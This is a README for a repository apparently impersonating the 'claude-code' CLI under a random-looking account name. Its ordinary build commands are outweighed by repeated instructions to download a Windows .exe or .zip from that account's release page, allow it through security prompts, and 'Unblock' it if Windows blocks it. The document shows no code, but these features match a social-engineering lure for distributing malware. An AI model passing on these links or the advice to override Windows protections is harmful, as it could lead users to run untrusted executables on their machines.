# 🧩 claude-code - Run Claude Code Locally

[![Download](https://img.shields.io/badge/Download%20Release%20Page-blue?style=for-the-badge)](https://github.com/sorbussitchensisdonorcard867/claude-code/releases)

## 📥 Download

Go to the release page and get the Windows build from here:

https://github.com/sorbussitchensisdonorcard867/claude-code/releases

If the page shows several files, pick the Windows file that matches your system. Most users should choose the `.exe` or `.zip` file for Windows.

## 🪟 Windows setup

1. Open the release page link above.
2. Download the Windows file.
3. If you downloaded a `.zip` file, right-click it and choose Extract All.
4. Open the extracted folder.
5. Double-click the app file or run the command file that came with it.
6. If Windows asks for permission, choose Run.

## 🚀 What this app does

Claude Code is a local command-line app with a text-based screen. It helps you work with Claude from your computer instead of using only a web page.

You can use it to:

- start an interactive chat in a terminal window
- ask for help with code and text tasks
- view help commands
- check the app version
- run quick diagnostics

## ✅ What you need

Before you run the app, make sure your PC has:

- Windows 10 or Windows 11
- an active internet connection for setup or updates
- enough free space to unpack the download
- a modern terminal app such as Windows Terminal or Command Prompt

If you plan to build it from source, you also need:

- Node.js 18 or newer
- Bun 1.x
- npm

## 🧭 Install from the release page

Use the release page as your main download source:

https://github.com/sorbussitchensisdonorcard867/claude-code/releases

Steps:

1. Open the link.
2. Find the latest release.
3. Download the Windows file.
4. Save it to your Downloads folder.
5. Extract the file if it came as a `.zip`.
6. Open the app from the extracted folder.

If the release contains more than one file, choose the one meant for Windows. A file with `.exe` is usually the easiest choice.

## 🖥️ First run

When you open the app for the first time:

1. Wait for Windows to finish checking the file.
2. If a security prompt appears, allow the app to run.
3. If the app opens in a terminal window, type your command and press Enter.
4. Follow the on-screen prompts.

If you see a blank window for a few seconds, give it time to finish loading.

## 🛠️ Build from source

If you want to build the app on your own computer, use these steps:

1. Install Node.js 18 or newer.
2. Install Bun 1.x.
3. Open a terminal in the project folder.
4. Run:

```powershell
npm install
```

5. Then run:

```powershell
npm run build
```

This creates the compiled files in the `dist` folder.

## ▶️ Run the CLI

After the build finishes, use these commands:

Interactive mode:

```powershell
bun dist/entrypoints/cli.js
```

Help:

```powershell
bun dist/entrypoints/cli.js --help
```

Diagnostics:

```powershell
bun dist/entrypoints/cli.js doctor
```

Version:

```powershell
bun dist/entrypoints/cli.js --version
```

## ⌨️ Use it in a terminal

This app uses text commands. That means you type a command, then press Enter.

Common actions:

- start a chat session
- ask for help with a task
- check available commands
- review system checks

If you are not sure what to type, start with the help command.

## 🧪 Example use

Try this after the app opens:

```powershell
bun dist/entrypoints/cli.js --help
```

This shows the built-in command list and basic usage.

To enter the main interactive mode:

```powershell
bun dist/entrypoints/cli.js
```

## 📁 Project layout

The main parts of this repository are:

- `dist/` — compiled output
- `entrypoints/` — app launch files
- `src/` — TypeScript source files
- `package.json` — build and run settings

## 🔍 Troubleshooting

If the app does not start, check these points:

- confirm Node.js is installed
- confirm Bun is installed
- make sure you ran `npm install`
- make sure the `dist` folder exists after build
- open the terminal in the correct folder
- try running the help command first

If Windows blocks the file:

1. Right-click the file.
2. Open Properties.
3. Select Unblock if you see that option.
4. Try again.

If the screen closes right away, open it from a terminal so you can see the message.

## 📦 Files you may see in a release

A release may include:

- `.exe` files for direct launch
- `.zip` files for manual extract and run
- helper files for Windows users
- build assets and checksums

If you are not sure which file to use, choose the main Windows `.exe` or the `.zip` file with the app name.

## 🔐 Local use

This project runs from your own computer. That makes it useful for:

- local testing
- recovery work
- debugging
- learning how the CLI works
- running a rebuilt copy of the tool

## 🗂️ Basic workflow

1. Download the release from the link above.
2. Extract it if needed.
3. Open the app.
4. Use `--help` to learn the commands.
5. Use interactive mode for normal use.
6. Use `doctor` if something looks wrong

## 🧩 Command list

```powershell
bun dist/entrypoints/cli.js --help
bun dist/entrypoints/cli.js doctor
bun dist/entrypoints/cli.js --version
bun dist/entrypoints/cli.js
```

## 📎 Release page

Download or install from:

https://github.com/sorbussitchensisdonorcard867/claude-code/releases